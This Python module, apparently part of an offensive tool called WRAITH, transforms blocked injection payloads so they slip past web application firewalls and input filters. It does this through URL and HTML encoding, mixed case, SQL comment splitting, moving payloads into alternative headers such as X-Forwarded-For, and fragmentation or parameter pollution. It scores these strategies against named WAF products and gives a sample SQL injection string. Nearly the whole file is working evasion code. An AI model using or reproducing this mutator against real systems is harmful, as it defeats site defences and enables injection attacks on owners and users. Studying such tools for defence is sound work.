"""
WRAITH Payload Mutator — Adaptive Payload Transformation Engine

When a payload is blocked (by WAF, input filter, or sanitization),
the mutator generates alternative payloads using 5 mutation strategies.
Over time, it learns which mutations work against which defenses
by consulting historical data from the PayloadLogger.

Mutation Strategies:
    1. Encoding    — URL encode, double encode, HTML entities
    2. Case        — Mixed case, keyword splitting with comments
    3. Header      — Move payload to alternative HTTP headers
    4. Fragment    — Split payload across multiple parameters
    5. Comment     — Inject SQL/HTML comments into payload

Design: Mutations are applied lazily — we try the cheapest/fastest
strategy first, then escalate. Historical success rates (from
PayloadLogger) inform the strategy ordering.
"""

from __future__ import annotations

import random
from typing import Any
from urllib.parse import quote, quote_plus

from payload_engine.logger import PayloadLogger
from utils.logger import get_logger

logger = get_logger("payload_engine.mutator")


# ===================================================================
# Mutation Strategy Definitions
# ===================================================================

class MutationStrategy:
    """Base class for a payload mutation strategy."""

    name: str = "base"

    def mutate(self, payload: str, context: dict[str, Any] | None = None) -> list[str]:
        """Generate mutated payloads. Returns a list of alternatives."""
        raise NotImplementedError


class EncodingMutation(MutationStrategy):
    """URL encode, double encode, HTML entity encode."""

    name = "encoding"

    def mutate(self, payload: str, context: dict[str, Any] | None = None) -> list[str]:
        mutations = []

        # Single URL encode
        mutations.append(quote(payload, safe=""))

        # Double URL encode
        mutations.append(quote(quote(payload, safe=""), safe=""))

        # URL encode only special characters (keep alphanumeric)
        mutations.append(quote_plus(payload))

        # HTML entity encoding for key characters
        html_encoded = payload
        for char, entity in [
            ("'", "&#39;"), ('"', "&#34;"), ("<", "&lt;"),
            (">", "&gt;"), ("&", "&amp;"),
        ]:
            html_encoded = html_encoded.replace(char, entity)
        if html_encoded != payload:
            mutations.append(html_encoded)

        # Unicode escape sequences
        unicode_payload = ""
        for ch in payload:
            if not ch.isalnum() and ch != " ":
                unicode_payload += f"\\u{ord(ch):04x}"
            else:
                unicode_payload += ch
        if unicode_payload != payload:
            mutations.append(unicode_payload)

        return mutations


class CaseMutation(MutationStrategy):
    """Mixed case and keyword obfuscation."""

    name = "case"

    _SQL_KEYWORDS = [
        "SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
        "INSERT", "UPDATE", "DELETE", "DROP", "ALTER",
        "EXEC", "EXECUTE", "SCRIPT", "ALERT", "ONLOAD",
    ]

    def mutate(self, payload: str, context: dict[str, Any] | None = None) -> list[str]:
        mutations = []

        # Mixed case: SeLeCt, UnIoN, etc.
        mixed = ""
        for i, ch in enumerate(payload):
            mixed += ch.upper() if i % 2 == 0 else ch.lower()
        if mixed != payload:
            mutations.append(mixed)

        # Keyword splitting with SQL comments: SEL/**/ECT
        for kw in self._SQL_KEYWORDS:
            if kw.lower() in payload.lower():
                # Find the keyword (case-insensitive) and split it
                idx = payload.lower().find(kw.lower())
                original_kw = payload[idx:idx + len(kw)]
                mid = len(original_kw) // 2
                split = original_kw[:mid] + "/**/" + original_kw[mid:]
                mutations.append(payload[:idx] + split + payload[idx + len(kw):])

                # Also try with whitespace comment
                split2 = original_kw[:mid] + "/**//**/" + original_kw[mid:]
                mutations.append(payload[:idx] + split2 + payload[idx + len(kw):])
                break

        # Alternating case for entire payload
        alt = ""
        alpha_idx = 0
        for ch in payload:
            if ch.isalpha():
                alt += ch.upper() if alpha_idx % 2 == 0 else ch.lower()
                alpha_idx += 1
            else:
                alt += ch
        if alt != payload and alt != mixed:
            mutations.append(alt)

        return mutations


class HeaderMutation(MutationStrategy):
    """
    Suggest moving the payload to alternative HTTP headers.
    Returns header names where the payload should be injected.
    """

    name = "header"

    _ALTERNATIVE_HEADERS = [
        "User-Agent",
        "Referer",
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Custom-IP-Authorization",
        "X-Client-IP",
        "True-Client-IP",
        "Origin",
        "Content-Type",
    ]

    def mutate(self, payload: str, context: dict[str, Any] | None = None) -> list[str]:
        """
        Returns payloads prefixed with target header names.
        Format: "HEADER:HeaderName:payload"
        The orchestrator should parse this and inject accordingly.
        """
        mutations = []
        for header in self._ALTERNATIVE_HEADERS:
            mutations.append(f"HEADER:{header}:{payload}")
        return mutations


class FragmentMutation(MutationStrategy):
    """Split payload across multiple parameters or chunks."""

    name = "fragment"

    def mutate(self, payload: str, context: dict[str, Any] | None = None) -> list[str]:
        mutations = []

        # Split at midpoint
        mid = len(payload) // 2
        mutations.append(f"FRAGMENT:{payload[:mid]}|||{payload[mid:]}")

        # Split at quarter points
        q1, q2, q3 = len(payload) // 4, len(payload) // 2, 3 * len(payload) // 4
        mutations.append(
            f"FRAGMENT:{payload[:q1]}|||{payload[q1:q2]}|||{payload[q2:q3]}|||{payload[q3:]}"
        )

        # HPP (HTTP Parameter Pollution) — duplicate the param
        mutations.append(f"HPP:{payload}")

        return mutations


class CommentMutation(MutationStrategy):
    """Inject comments into SQL/HTML payloads."""

    name = "comment"

    def mutate(self, payload: str, context: dict[str, Any] | None = None) -> list[str]:
        mutations = []

        # SQL inline comments around spaces
        mutations.append(payload.replace(" ", "/**/"))

        # SQL comments with random content
        mutations.append(payload.replace(" ", "/*!*/"))

        # MySQL version-specific comment
        mutations.append(payload.replace(" ", "/*!50000 */"))

        # Double-dash comment variation
        if "--" in payload:
            mutations.append(payload.replace("--", "-- -"))
            mutations.append(payload.replace("--", "#"))

        # Newline injection (bypass line-based WAF rules)
        mutations.append(payload.replace(" ", "\n"))
        mutations.append(payload.replace(" ", "\t"))

        # Tab instead of space
        mutations.append(payload.replace(" ", "%09"))

        return mutations


# Registry of all mutation strategies
_STRATEGIES: dict[str, MutationStrategy] = {
    "encoding": EncodingMutation(),
    "case": CaseMutation(),
    "comment": CommentMutation(),
    "header": HeaderMutation(),
    "fragment": FragmentMutation(),
}


# ===================================================================
# PayloadMutator — Main Entry Point
# ===================================================================

class PayloadMutator:
    """
    Generates payload mutations to bypass WAFs and input filters.

    Maintains awareness of historical success rates (via PayloadLogger)
    and orders mutation strategies accordingly — strategies that have
    historically worked well against the detected WAF are tried first.

    Usage:
        mutator = PayloadMutator(payload_logger=logger_instance)

        # Get mutation suggestions for a failed payload
        mutations = mutator.suggest_mutations(
            payload="' OR 1=1 --",
            failure_context={
                "waf_signature": "modsecurity",
                "response_code": 403,
                "attack_class": "sqli",
            },
        )

        # Apply a specific mutation
        result = mutator.mutate("' OR 1=1 --", strategy="encoding")
    """

    def __init__(self, payload_logger: PayloadLogger | None = None) -> None:
        self._logger = payload_logger
        self._strategies = dict(_STRATEGIES)
        logger.info(
            f"PayloadMutator initialized — "
            f"{len(self._strategies)} strategies available"
        )

    # ===================================================================
    # Core Methods
    # ===================================================================

    def mutate(
        self,
        payload: str,
        strategy: str = "encoding",
        context: dict[str, Any] | None = None,
    ) -> list[str]:
        """
        Apply a specific mutation strategy to a payload.

        Args:
            payload: The original payload to mutate.
            strategy: Mutation strategy name.
            context: Optional context dict (WAF info, attack class, etc.)

        Returns:
            List of mutated payload strings.
        """
        strat = self._strategies.get(strategy)
        if not strat:
            logger.warning(f"Unknown mutation strategy: {strategy}")
            return []

        mutations = strat.mutate(payload, context=context)

        # Deduplicate and remove original
        unique = []
        seen = {payload}
        for m in mutations:
            if m not in seen and m.strip():
                seen.add(m)
                unique.append(m)

        logger.debug(
            f"Strategy '{strategy}' generated {len(unique)} mutations "
            f"for payload: {payload[:30]}..."
        )
        return unique

    def suggest_mutations(
        self,
        payload: str,
        failure_context: dict[str, Any] | None = None,
        max_mutations: int = 10,
    ) -> list[dict[str, Any]]:
        """
        Generate ranked mutation suggestions for a failed payload.

        Uses historical success rates to order strategies. Returns
        a list of mutation suggestions sorted by likelihood of success.

        Args:
            payload: The failed payload.
            failure_context: Dict with keys like:
                - waf_signature: detected WAF product
                - response_code: HTTP status
                - attack_class: type of attack
            max_mutations: Maximum total mutations to return.

        Returns:
            List of dicts:
                - payload: mutated payload string
                - strategy: which strategy generated it
                - priority: float score (higher = try first)
        """
        context = failure_context or {}
        waf = context.get("waf_signature", "")
        attack_class = context.get("attack_class", "")

        # Determine strategy ordering based on context
        strategy_order = self._rank_strategies(waf, attack_class)

        suggestions = []
        for strategy_name, priority_score in strategy_order:
            mutations = self.mutate(payload, strategy=strategy_name, context=context)
            for mutation in mutations:
                suggestions.append({
                    "payload": mutation,
                    "strategy": strategy_name,
                    "priority": priority_score,
                })

        # Sort by priority (highest first) and limit
        suggestions.sort(key=lambda x: x["priority"], reverse=True)
        suggestions = suggestions[:max_mutations]

        logger.info(
            f"Generated {len(suggestions)} mutation suggestions "
            f"for payload: {payload[:30]}... "
            f"(WAF: {waf or 'unknown'})"
        )
        return suggestions

    def get_all_mutations(
        self,
        payload: str,
        context: dict[str, Any] | None = None,
    ) -> dict[str, list[str]]:
        """
        Apply ALL mutation strategies and return grouped results.

        Useful for debugging and analysis.

        Returns:
            Dict mapping strategy name to list of mutations.
        """
        results = {}
        for name in self._strategies:
            mutations = self.mutate(payload, strategy=name, context=context)
            if mutations:
                results[name] = mutations
        return results

    # ===================================================================
    # Strategy Ranking
    # ===================================================================

    def _rank_strategies(
        self,
        waf_signature: str = "",
        attack_class: str = "",
    ) -> list[tuple[str, float]]:
        """
        Rank mutation strategies by expected effectiveness.

        Uses:
            1. WAF-specific knowledge (hardcoded heuristics)
            2. Historical success rates (from PayloadLogger)
            3. Attack-class-specific defaults

        Returns:
            List of (strategy_name, priority_score) tuples,
            sorted by score descending.
        """
        scores: dict[str, float] = {name: 5.0 for name in self._strategies}

        # WAF-specific heuristics
        waf_lower = waf_signature.lower()
        if waf_lower == "modsecurity":
            scores["comment"] += 3.0    # ModSec is weak against comment injection
            scores["case"] += 2.0       # Mixed case often bypasses CRS
            scores["encoding"] += 1.0
        elif waf_lower == "cloudflare":
            scores["encoding"] += 3.0   # Double encoding often works
            scores["header"] += 2.0     # Header injection can bypass
            scores["fragment"] += 1.5
        elif waf_lower in ("aws_waf", "imperva"):
            scores["header"] += 3.0
            scores["fragment"] += 2.5
            scores["comment"] += 1.0
        elif waf_lower == "sucuri":
            scores["encoding"] += 2.0
            scores["case"] += 2.0
        else:
            # No specific WAF — try encoding first (cheapest)
            scores["encoding"] += 2.0
            scores["comment"] += 1.5

        # Attack-class-specific adjustments
        if attack_class in ("sqli", "sql_injection"):
            scores["comment"] += 2.0    # SQL comments are very effective
            scores["case"] += 1.5       # SQL is case-insensitive
        elif attack_class == "xss":
            scores["encoding"] += 2.0   # HTML encoding bypass
            scores["case"] += 1.0
        elif attack_class == "ssti":
            scores["encoding"] += 1.5
        elif attack_class in ("ssrf", "path_traversal"):
            scores["encoding"] += 3.0   # Path encoding is critical
            scores["fragment"] += 1.0

        # Historical success rates (if logger is available)
        if self._logger:
            try:
                mutation_stats = self._logger.get_mutation_stats()
                for stat in mutation_stats:
                    name = stat.get("mutation", "")
                    rate = stat.get("rate", 0.0)
                    if name in scores:
                        # Boost successful strategies, penalize failures
                        scores[name] += rate * 5.0
            except Exception:
                pass

        # Sort by score descending
        ranked = sorted(scores.items(), key=lambda x: x[1], reverse=True)
        return ranked
